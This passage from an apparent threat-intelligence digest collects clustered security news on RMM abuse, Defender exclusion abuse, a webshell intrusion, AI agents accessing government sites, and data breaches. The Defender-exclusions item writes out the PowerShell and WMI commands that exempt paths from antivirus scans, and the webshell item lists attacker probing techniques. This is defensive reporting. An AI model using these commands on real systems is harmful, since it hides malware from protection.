summary to get a quick overview of each investigation, including: When the investigation began Which customer and which endpoint, identity, or other asset was involved Which signal types were investigated ( EDR , ITDR , etc) How many signals contributed to the investigation Status, including investigations closed as benign or reported The Investigations dashboard gives partners a single view of every Huntress investigation, including those closed as benign. From here, partners can quickly search, filter, and jump into the details that matter most for an organization or endpoint. How to use security incident investigations in your organization The goal of this experience is simple: help you tell a clearer story about how Huntress is protecting your organization or customers. With the Investigations View, you can: Show the volume of investigations our SOC handles on behalf of each organization Walk through specific investigations during QBRs or security reviews Answer tough
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: New Huntress View for Security Incident Investigations
  - Published: 2026-10-01T21:00:00+00:00
  - Link: https://www.huntress.com/blog/security-incident-investigations-partner-view
  - Summary: See how the Huntress SOC runs security incident investigations from first signal to final resolution, including the ones closed as benign.

### Cluster 542929f911 — score 8

- Title: Huntress Tragic Quadrant: Top Cyber Threats Wrecking Businesses
- Source: Huntress (detection_response_operations)
- Published: 2026-10-01T13:00:00+00:00
- Link: https://www.huntress.com/blog/huntress-tragic-quadrant-cyber-threats
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, mfa_bypass, phishing_social_eng, ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, mfa_bypass, active_exploitation
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The Huntress Tragic Quadrant ranks the cyber threats hitting businesses most, from RMM abuse to AiTM, ClickFix, using real SOC data.
```

#### Full body

```
Home Blog The Huntress Tragic Quadrant: Beat the Hype on Cyber Tactics Wrecking Businesses Published: October 1, 2026 The Huntress Tragic Quadrant: Beat the Hype on Cyber Tactics Wrecking Businesses By: Beth Robinson Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways The cyber threats that most often disrupt real businesses aren't the flashy, headline-grabbing attacks, but repeatable tactics abusing tools you already trust. The Huntress Tragic Quadrant ranks these tactics by how common they are across the telemetry footprint and how close they sit to real business disruption. The OH $#!T corner highlights the biggest near-term risks, including RMM abuse, mailbox manipulation on the path to BEC, and AiTM-style account takeover that sidesteps MFA. Other emerging tactics like device code phishing, ClickFix, and AI platform abuse start in other corners of the Tragic Quadrant, but they're evolving fast and deserve a plan before they move into the top-right of the quadrant. The threats that most often knock companies off balance rarely match the flashy ones dominating cyber headlines. If you run a small or mid-sized organization, whether you handle IT yourself or outsource, you're working with limited time and tools while attackers keep moving faster than you can track. You need a clear picture of which attacks are really landing in environments like yours and which of those can quietly snowball, especially the ones that twist everyday tools into quiet business disruption. That's why we created the Huntress Tragic Quadrant , a ranking of the most common threats we see putting your business at risk of a major unwanted interruption. Instead of focusing on what's trending in the news cycle, the Tragic Quadrant focuses on what our telemetry data and real-world Security Operations Center (SOC) investigations show us. How the Tragic Quadrant works The Tragic Quadrant ranks cyber tactics based on two factors: How common a cyber tactic is across the environments we monitor (prevalence) How close it puts an organization to major damage when it lands (pucker factor) Figure 1: The Huntress Tragic Quadrant The farther right a tactic lands, the more often we see it across our telemetry footprint. The higher it lands, the closer it sits to a business disruption event, especially without the right defenses to shut it down. That view comes from more than 5 million endpoints and 15 million identities spanning nearly 300,000 organizations we protect. The threats on this quadrant draw on data from detections and incidents we've worked on so far in 2026, the Huntress 2026 Cyber Threat Report , and in-the-wild examples our SOC has investigated across partner and customer environments. Wherever you see a solid dot, it means we've seen that threat accelerated by AI . If you only have time to focus on one cyber threat, the top right is where to start. That OH $#!T corner is where tactics are both widespread and dangerously close to outcomes like ransomware, data theft, or business email compromise (BEC). That's where you can close the gap fastest before these tactics become major business disruptions. Why the OH $#!T Corner deserves your immediate attention The OH $#!T corner covers the techniques that show up most often and put you just a short step away from chaos when they get into your environment. These techniques intentionally lean on the types of tools and workflows your business already uses and trusts. RMM abuse is steady and holding Remote monitoring and management (RMM) tools are a staple for IT teams who need to manage systems from anywhere. That same access and persistence also make them attractive to attackers. Because RMM tools are already trusted, RMM abuse blends in with routine admin work. All it takes is one rogue RMM tool installed for an attacker to gain persistent access that looks just like ordinary administrator behavior. In Q1 2026, 45% of endpoint-related incidents Huntress investigated involved RMM abus
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Huntress Tragic Quadrant: Top Cyber Threats Wrecking Businesses
  - Published: 2026-10-01T13:00:00+00:00
  - Link: https://www.huntress.com/blog/huntress-tragic-quadrant-cyber-threats
  - Summary: The Huntress Tragic Quadrant ranks the cyber threats hitting businesses most, from RMM abuse to AiTM, ClickFix, using real SOC data.

### Cluster 530d7cb170 — score 8

- Title: Defender Exclusion Abuse: How Attackers Hide Malware from MDAV
- Source: Huntress (detection_response_operations)
- Published: 2026-09-30T17:30:00+00:00
- Link: https://www.huntress.com/blog/you-can-run-but-you-cant-hide-defender-exclusions
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
See how attackers like GootKit and WhisperGate abuse Windows Defender exclusions to hide malware from AV scans — and how Huntress detects it.
```

#### Full body

```
Home Blog You Can Run, but You Can’t Hide: Defender Exclusions Last Updated: September 30, 2026 You Can Run, but You Can’t Hide: Defender Exclusions By: Jonathan Johnson Summarize with AI Summarize ChatGPT Claude Perplexity Google AI The endpoint team at Huntress is focused on providing telemetry and protections around real adversary threats. One thing we've noticed that's often overlooked is adversaries leveraging Microsoft Defender Antivirus (MDAV) settings to circumvent scans on their malicious binaries. Obviously, turning off Defender completely is ideal for adversaries, but the setting we’re going to discuss today is MDAV exclusions. Exclusions are a capability that Microsoft has exposed. They allow a user with administrator privileges or higher to circumvent AV scans on folders, binaries, and IP addresses. Depending on the use case, an attacker can leverage Exclusions more stealthily than shutting the antivirus down completely. Before we dive into the adversary tradecraft, let’s take a look into the internals of MDAV exclusions. Microsoft supports four types of Antivirus exclusions , which support different actions on the exclusions: Types of windows defender exclusions Exclusion Type Description Process Disables real-time scanning on files that are opened by specific processes, i.e., specified (source) process is not scanned. Path Excludes entire file paths from real-time/scheduled scans. Extension Disables real-time/scheduled/custom scans on certain file extensions. IpAddress Disables network packet inspection incoming from a certain IP. There are a few different ways someone can interact with MDAV exclusions: PowerShell ( Set-MpPreference / Add-MpPreference ) WMI ( MSFT_MpPreference Class) Group Policy (GPO) Direct Registry Modification When someone sets an exclusion via PowerShell, the call execution goes through the MSFT_MpPreference WMI Class. Then it makes its way through COM & RPC to eventually transition execution to MsMpEng.exe (the MDAV binary). MsMpEng.exe then makes a registry modification to the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions registry key. If someone creates an exclusion via a GPO, the execution flow often goes through the GPO svchost ( C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc ) which sets a registry value within the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions . Note: This is a different registry key than the one that MsMpEng.exe modifies. However, whenever someone tries to query the Defender exclusions, it will query the exclusions set by GPO and MDAV. Figure 1 shows a ProcMon result while running (Get-MpPreference).ExclusionPath in PowerShell. Figure 1: Registry activity shown by ProcMon Now that we understand MDAV exclusions a little bit better, let's dive into attacker tradecraft. How Attackers abuse defender exclusions As you can probably tell, exclusions are a great way to circumvent MDAV scans, and the two types of exclusions that are most used and valuable to an attacker are Path and Extension exclusions. When those two exclusions are set, the path/process that matches that exclusion is removed from scheduled scans, on-demand scans, and always-on, real-time protection and monitoring. We see this with the following adversary campaigns: GootKit - 2019 Creates an MDAV path exclusion via the MSFT_MpPreference WMI Class. WhisperGate - 2022 Creates an MDAV path exclusion for the C:\ Drive via PowerShell’s Set-MpPreference CmdLet Muddled Libra - 2024 As mentioned above, plenty of ways exist to create an entry into the exclusion policy—PowerShell, WMI, GPO, and direct registry modification. Let’s take a look at an example of each: PowerShell: Set-MpPreference : Set-MpPreference -ExclusionPath C:\Temp Add-MpPreference : Add-MpPreference -ExclusionPath C:\Temp WMI: Add Method in MSFT_MpPreference Class : Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Add -Arguments
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Defender Exclusion Abuse: How Attackers Hide Malware from MDAV
  - Published: 2026-09-30T17:30:00+00:00
  - Link: https://www.huntress.com/blog/you-can-run-but-you-cant-hide-defender-exclusions
  - Summary: See how attackers like GootKit and WhisperGate abuse Windows Defender exclusions to hide malware from AV scans — and how Huntress detects it.

### Cluster 86d50ce475 — score 8

- Title: Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers
- Source: Huntress (detection_response_operations)
- Published: 2026-09-30T04:00:00+00:00
- Link: https://www.huntress.com/blog/parks-recreation-platform-webshell-attack
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_industries: government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_industries: government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Huntress SOC found a threat actor exploiting a file upload flaw in recreation management to breach 3 municipal servers and steal payment data.
```

#### Full body

```
Home Blog Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers Published: September 30, 2026 Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers By: Cristian Poenaru Susannah Matt Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways Huntress recently observed three web servers compromised via a vulnerability in a popular web-based recreation management software platform designed for local municipalities, parks, and recreation organizations. After multiple failed attempts, the threat actor gained access by exploiting a flaw in the platform's file upload function, then used the same technique across all three servers: register a new account, abuse the member files upload function to launch webshells, and ultimately steal payment card data. User-agent strings suggest that the threat actor is based in China. We also suspect the use of AI-generated scripts throughout the kill chain, from the large number of failed initial access probes to the final upload of PowerShell scripts with extensive comments in the provided instructions. The threat actor may have suspected that we were onto them: They changed tactics after compromising the second web server, adopting more defense evasion techniques such as renaming files and manipulating timestamps in metadata. When one of the servers was brought back into production prematurely, the threat actor returned to launch a wider attack on the platform's users by injecting a trojan within the authentication page that harvests credentials in real time. Acknowledgments : Special thanks to Olly Maxwell for his contributions to this investigation and write-up. Background On September 10, 2026, Huntress observed a threat actor compromising multiple tenants on a shared recreation management software platform using one repeatable trick: register a member account, upload a malicious file, and turn it into a webshell. The webshells were used to execute malicious activity across three web servers. Attempting to identify and extract sensitive information, they enumerated and probed the payment/secure tenant and planted disguised copies where its folders existed. The attacker adapted their tradecraft throughout all three compromises. They learned, got quieter, added anti-forensics, and then walked straight back in after a server was cleaned but not fully locked down. Below, we tell the full story of the attack in four acts, outlining the adversary's learning curve and the different techniques used. Act 1: Loud and clumsy on the first server The attacker was determined to get in, spending roughly 6 hours throwing unauthenticated exploitation technique after technique at the web server, perhaps with the help of AI-generated scripts. Attempted initial access techniques included: Brute forcing two different login pages IIS 8.3 tilde enumeration WebDAV write verbs Upload-handler parser bypasses Forced browsing The initial brute-force attempts against the admin login page, ending in /management/login.aspx , and the members' login page /info/household/login.aspx were met with HTTP result code 200 (try again) rather than 302 (redirect to management or members page). Undeterred, the attacker then attempted multiple probing techniques, including exploiting an IIS 8.3 tilde vulnerability by crafting a request containing the tilde character, such as a*~1*, to enumerate hidden files and directories. After that failed, the attacker pivoted to HTTP method manipulation, trying eight different WebDAV methods testing for improper access controls on target files. Every attempt failed except the OPTIONS method, which returned the available methods allowed by the web server. Other failed probes included modifying the webserver's Upload.ashx and FileUpload.ashx dynamic script files, appending ::$DATA to NTFS Alternative Data Streams, and attempting to bypass simple string-matching rules with case flipping. Access granted: Rec
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers
  - Published: 2026-09-30T04:00:00+00:00
  - Link: https://www.huntress.com/blog/parks-recreation-platform-webshell-attack
  - Summary: Huntress SOC found a threat actor exploiting a file upload flaw in recreation management to breach 3 municipal servers and steal payment data.

### Cluster 1a8594f0b4 — score 8

- Title: Security briefing: September 2026
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-05T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/security-briefing-september-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: education, financial_services, government
- affected_products: OpenAI/ChatGPT
- cve_ids: CVE-2026-39987
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services, government, education
- affected_products: OpenAI/ChatGPT
- cve_ids: CVE-2026-39987
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
It may be October as you read this, but I bet many organizations got the creeps in September as environments were continuously breached. There were scams, old-fashioned human actors, a few agents making mistakes, and some persistent actors taking full advantage of a new vulnerability.
```

#### Full body

```
< back to blog Security briefing: September 2026 Published by: Crystal Morin Sr. Cybersecurity Strategist @ linkedin Published: October 5, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more Peek-a-boo, who’s spying on you? It may be October as you read this, but I bet many organizations got the creeps in September as environments were continuously breached. There were scams, old-fashioned human actors, a few agents making mistakes, and some persistent actors taking full advantage of a new vulnerability. While those threats may all have come from very different players, most posed the same defensive challenge: a gap between initial access and anyone noticing something was wrong. Peek-a-boo! Are you watching your cloud environment in real time? Let’s dive into the details of September’s security news. Sep 12: Fintech organization hands sensitive information to fraudsters British neobank and fintech company Revolut confirmed on September 12th that a limited number of customers’ sensitive information was passed off to an unauthorized party. The threat actor claiming the campaign, identified as “IAmNotAVillain” (ironic, isn’t it?), established an email address under a legitimate government agency domain to send a request for information to Revolut. According to the threat actor, 147 GB of data was obtained over the course of six months. The data allegedly included names, occupations, contact details, personal documentation, selfies, account statements, and transaction history. This is not a failure you can patch or block your way out of. This is a process failure that highlights the importance of identity verification and the sophistication of modern social engineering campaigns. Sep 24-25: OpenAI agents go off-script against multiple governments On September 24, it was made public that an experimental OpenAI model agent accessed a Services Australia Medicare portal in June while conducting research. The system breach wasn’t identified until an internal review in August, and Australian officials were notified about one month later. On September 25, news came out that OpenAI’s research agents also accessed three US federal agency websites : the SEC, Department of Education, and Department of Commerce. OpenAI has since issued a warning stating that possibly “dozens” more global governments, universities, and institutions could have been accessed. The primary issue that few are talking about is the gap between access and identification. While these weren’t “malicious” breaches, some agents bypassed security controls. Consider whether your organization is capable of identifying an agent accessing your environment, or prepared for your own agent going rogue outside of your control in real time. Additional Sysdig TRT findings A human operator with machine speed On September 11, the Sysdig Threat Research Team (TRT) profiled a human operator who matched some of the attack speeds set by AI-driven attackers on the same marimo CVE-2026-39987. The operator hand-rolled a Python toolkit over roughly four hours, then ran a nine-hour session with 850+ interactive commands. The operator opened the probe file twice and never echoed the marker that agentic threat actors (ATAs) trip over religiously. This is a clear signal of a human over AI. The operator did present a coding error when they fired an EC2 Instance Connect key push against a null instance ID. Otherwise, the attack was much more thoughtful and evasive than noisy AI-driven attacks that will fail fast and try again. AI may lower the barrier to entry for cybercriminals, but it still hasn't replaced the skilled attacker who can build from scratch to avoid traps and evade detection. Defenders need to focus on detecting the attack chain shape, not the attacker type. A Secrets Manager call, SSH key handoff, and outbound
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: Security briefing: September 2026
  - Published: 2026-10-05T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/security-briefing-september-2026
  - Summary: It may be October as you read this, but I bet many organizations got the creeps in September as environments were continuously breached. There were scams, old-fashioned human actors, a few agents making mistakes, and some persistent actors taking full advantage of a new vulnerability.

### Cluster 77f69fdf7a — score 8

- Title: With AI agents, runtime is the only place truth lives
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-01T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/with-ai-agents-runtime-is-the-only-place-truth-lives
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Runtime security for AI agents: if an agent is compromised, so is its account of itself. Sysdig's founder on the only truth that can't be forged.
```

#### Full body

```
< back to blog With AI agents, runtime is the only place truth lives Published by: Loris Degioanni Founder & CTO @ linkedin See Sysdig AI Defense live Published: October 1, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more Lately, some of the most influential people in security and AI have been arguing publicly about how fast frontier AI models should be developed. While that’s an important debate with very real stakes, it's not the only one shaping what security teams have to deal with today. The AI agents that matter to our organizations right now have already been deployed, or are in the process of being deployed. They run in real infrastructure, hold credentials, and reach production applications. Our businesses already depend on them and won’t pause while we sort out the pace of what comes next. So, instead of focusing on that, I’d like to explore something concrete: What actually changed underneath our security programs in the last year and, in technical terms, what it takes to get ahead. The challenge of securing agentic AI For most of my career, cybersecurity meant defending people and organizations, and you did that by protecting their software assets: applications, data, and infrastructure. Software assets are deterministic. You know exactly what the software is capable of doing before it runs. That single property is the foundation beneath nearly every control security teams have built, and it’s why you can write a policy in advance. That’s also why allowlists work and baselines matter. On the other side of that coin, you have people, and people have identities. When something goes wrong, there’s a name attached. You have an account, a session, a manager, and a chain of accountability. An agent is neither a traditional software asset nor a person. It is software doing a job, running with human-grade abilities and access, choosing its own steps. It writes its plan while it runs, and its plan can be different the next time, even for the same request. So the two assumptions holding up our controls for people and software both break: You cannot enumerate the behavior in advance, and the identity acting on the system may very well not be the identity responsible for it. This is a wholly different kind of thing running inside your environment. It poses a novel challenge that requires a proportionate solution. Agents move faster than people can review by hand AI agents act, fail, and correct themselves in seconds. In July, our threat research team discovered an operator they dubbed JADEPUFFER , the first documented end-to-end agentic ransomware campaign. A threat actor pointed their AI at a CVE and then took their hands off the keyboard while the agent ran the full campaign alone. To me, the most striking detail about JADEPUFFER was a login failure the AI agent triaged and fixed in 31 seconds. It diagnosed its own mistake, changed its approach, and launched a working fix in less than a minute. JADEPUFFER happened to be an attacker’s agent, but nothing about that speed is unique to outside threats. The AI agents that organizations deploy plan, fail, and retry at the same pace, with whatever access they’re given. I don’t bring up these findings to be alarmist, but because of what they mean to a security team’s operating assumption. Every security program I’ve seen has a human somewhere in the loop, reviewing, approving, or escalating. Thirty-one seconds is not a pace at which people can review and still stay ahead. Neither is eight minutes , which is the time it took another AI-assisted intrusion to reach administrative access. This doesn’t mean taking humans out of security, but it does mean augmenting human speed so it doesn’t stand between a threat and a real-time response. Defense can’t be a step that happens after the fact. It has to be the thing
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: With AI agents, runtime is the only place truth lives
  - Published: 2026-10-01T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/with-ai-agents-runtime-is-the-only-place-truth-lives
  - Summary: Runtime security for AI agents: if an agent is compromised, so is its account of itself. Sysdig's founder on the only truth that can't be forged.

### Cluster 9f30a990e8 — score 8

- Title: Denmark population registry data breach affects 8.8 million people
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-05T15:21:10+00:00
- Link: https://www.bleepingcomputer.com/news/security/denmark-population-registry-data-breach-affects-88-million-people/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- actor_attribution: Rhysida
- affected_industries: education
- affected_products: OpenAI/ChatGPT
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- actor_attribution: Rhysida
- affected_industries: education
- affected_products: OpenAI/ChatGPT
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Denmark's Central Population Register (CPR) is warning of a data breach that exposed the personal information of approximately 8.8 million registered individuals. [...]
```

#### Full body

```
Denmark population registry data breach affects 8.8 million people By Bill Toulas October 5, 2026 11:21 AM 0 Denmark's Central Population Register (CPR) is warning of a data breach that exposed the personal information of approximately 8.8 million registered individuals. This includes people who live in the country, individuals who have moved abroad, and also deceased people. The CPR is the country's national civil registry, containing personal information on residents, including names, addresses, dates of birth, marital status, and unique CPR identification numbers. According to a CPR announcement published earlier today, threat actors misused a private Danish company's legitimate access to the registry system to obtain names, addresses, CPR numbers, and other information relating to registered members. A separate announcement by the Danish Data Protection Agency says that the attack involved some form of brute-forcing to enumerate valid CPR numbers, and then extract the related data from each entry. The CPR system currently holds data for 11 million registered citizens, so the incident impacted a large portion (80%) of that, but not everyone. The security incident occurred in September 2026, but CPR administration became aware of the breach on October 2 and determined the size of the impact over the weekend. The private company's access to the registry has now been blocked, and police have launched an investigation, which is currently underway. "This is an extremely serious incident, which is why I have also informed Parliament’s Business and Digitalization Committee," stated Minister for Research, Education and Digitalization Christina Egelund. "Together with all relevant authorities, we are working to establish the full extent of the incident." Egelund said additional security measures have been implemented to prevent similar incidents on the CPR system, and urged citizens to stay on high alert for unsolicited communications. A dedicated "cyber hotline" has been set up for potentially affected individuals,, and help and guidance are also available online at sikkerdigital.dk . "In light of the incident, everyone is reminded never to disclose passwords or other confidential information in response to telephone calls, emails, or similar communications," the announcement warned. "This also applies even if the recipient appears to know your name, address, and CPR number." BleepingComputer has contacted the agency to learn more about the incident, including how the private company was compromised, but we have not received a response as of publication. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: OpenAI hacked Australian Medicare govt site, probed data providers Sweden fines Miljödata $183,000 over breach affecting 2.2 million Japan's Digital Agency says VPN flaw exposed 246,000 personnel records Berlin confirms data theft after Rhysida ransomware attack claims Sakura Internet hack exposes data of up to 1.36 million accounts
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Denmark population registry data breach affects 8.8 million people
  - Published: 2026-10-05T15:21:10+00:00
  - Link: https://www.bleepingcomputer.com/news/security/denmark-population-registry-data-breach-affects-88-million-people/
  - Summary: Denmark's Central Population Register (CPR) is warning of a data breach that exposed the personal information of approximately 8.8 million registered individuals. [...]

### Cluster b99725e49d — score 8

- Title: 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-05T12:35:15+00:00
- Link: https://www.securityweek.com/250000-impacted-by-data-breaches-at-new-jersey-texas-healthcare-firms/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, phishing_social_eng, ransomware_extortion, web_shell_backdoor, zero_day
- actor_attribution: ShinyHunters
- affected_industries: critical_infrastructure, healthcare
- affected_products: Fortinet, Microsoft SharePoint, npm
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach, web_shell_backdoor, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: healthcare, critical_infrastructure
- affected_products: npm, Microsoft SharePoint, Fortinet
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers stole patient information from Clover Health Investments and AngMar Management Services in July. The post 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms appeared first on SecurityWeek .
```

#### Full body

```
Healthcare organizations Clover Health Investments and AngMar Management Services are notifying more than 250,000 people that their information was stolen in separate data breaches. Jersey City, New Jersey-based Clover Health Investments was hacked in early July , after attackers used social engineering to compromise three non-managerial health plan employee accounts. The incident resulted in the theft of personally identifiable information (PII) and protected health information (PHI), the company said in an SEC filing in July. The potentially affected information included names, dates of birth, insurance identifiers, and account identification numbers, the company revealed. In mid-September, Clover Health Investments told the US Department of Health and Human Services (HHS) that 138,677 people were affected. HHS added the company to its data breaches portal last week. Mansfield, Texas-based AngMar Management Services identified suspicious activity on its systems in mid-July and confirmed in early September that hackers stole patient PII and PHI. Advertisement. Scroll to continue reading. AngMar Management Services provides business operations, administration, and support network management for home health and hospice care providers. The impacted information includes names, birth dates, Social Security numbers, diagnosis details, medical history data, health insurance information, patient IDs, provider names, prescription details, and dates of service. The Interlock ransomware group added AngMar Management Services to its Tor-based leak site in August, claiming to have stolen over 700 gigabytes of data. On September 16, the company notified HHS that 126,196 individuals were affected. The company was added to HHS’s data breach portal last week. Related: Pentagon Personnel Agency Data Breach Impacts 3 Million People Related: DC Health Agency Exposes 400,000 Beneficiary Records Related: Astrana Health Data Breach Impacts Private, Confidential Information Related: ShinyHunters Claims FBI Hack, Demands Retraction of Threat Report Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Linux Backdoor Abuses STUN Protocol, Exploits Dozens of Flaws Exploitation Hits Rejetto HFS Vulnerability Discovered by AI Alleged ShinyHunters Leader Arrested in Jordan Fortra Patches Critical Vulnerabilities in BoKS In Rare Move, Alleged Iranian State Hacker Extradited to US Warlock Expands SharePoint Exploitation in Critical Infrastructure Attacks Exploited Fortinet FortiMail Zero-Day Calls for Urgent Action Zimbra Vulnerability Exploited in the Wild Prior to Public Disclosure Latest News FBI Blames Contractor’s Missed Patch for ShinyHunters Breach FBI Arrests ‘Most Wanted’ Developer of Ploutus ATM Malware Apple to Tighten Full Disk Access Controls in macOS Amid AI Risks Cybersecurity M&A Roundup: 39 Deals Announced in September 2026 Long-Running NPM Malware Campaign Accumulates 40,000 Downloads 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register Social Engineering Detection Moves Into the Live Conversation Google Narrows Open Source Bug Bounty Amid Wave of Invalid Automated Reports Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Securing AI Agents, MCPs, and AI Automations October 7, 2026 Learn how to address potential risks and not restrict AI adoption in your organization. See what a centralized AI gateway is and how it works in practice. Register Virtual Event: Zero Trust & Identity Strategies Summit 2026 October 14, 2026 Join as we decipher the world of zero trust and share war stories on securing an organization by eliminating implicit trust and continuously validating ever
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms
  - Published: 2026-10-05T12:35:15+00:00
  - Link: https://www.securityweek.com/250000-impacted-by-data-breaches-at-new-jersey-texas-healthcare-firms/
  - Summary: Hackers stole patient information from Clover Health Investments and AngMar Management Services in July. The post 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms appeared first on SecurityWeek .

### Cluster 586d2da611 — score 8

- Title: Authorities seize KillSec extortion group infrastructure, arrest 3 alleged members
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-10-01T19:44:43+00:00
- Link: https://cyberscoop.com/killsec-ransomware-group-arrests-operation-killswitch/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: critical_infrastructure
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: critical_infrastructure
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The teenager-run cybercrime group victimized roughly 500 organizations in less than two years. The post Authorities seize KillSec extortion group infrastructure, arrest 3 alleged members appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Authorities arrested the alleged leader and two additional members of KillSec, a data extortion group primarily run by teenagers that successfully compromised about 500 organizations since 2024, Europol and the Justice Department said Thursday. Investigators said the alleged leader of the group is 16 years old, but declined to name them. One of the group’s accused members, Fouad Eltibrizi, was arrested Wednesday in the United Kingdom and awaits extradition to the United States, the Justice Department said. The Dutch national, who is accused of acting as a negotiator for the group, was indicted last month in Puerto Rico and faces up to 10 years in prison for unauthorized computer access conspiracy. Europol said a suspected developer involved in the group committed multiple crimes before they turned 18 in August. The arrests were part of “Operation KillSwitch,” a globally coordinated operation aided by 10 countries and private cybersecurity companies. Officials seized KillSec’s data-leak site and at least 110 terabytes of data, including information on the group’s criminal proceeds. Advertisement Law enforcement’s accumulated actions targeting KillSec’s infrastructure and people involved “imposed serious cost and degraded the adversary’s core capabilities,” the FBI’s Cyber Division said in a statement on X . “We have undermined the group’s ability to rebuild, limited their operational reach and reduced the likelihood of future attacks,” the FBI added. Europol said investigators gained control of domains and five central servers, including infrastructure the group used to manage its activities and store stolen data. The cybercrime group, which was also known as Kill Security Ransomware Group, exploited various defects to intrude victims’ computers or cloud-based network infrastructure and steal sensitive data for extortion demands. Officials said the group obtained substantial ransom payments in some cases. Officials from the United States and Europe searched eight residences in Spain, Greece, the United Kingdom and Romania, and investigators are looking through evidence seized during those 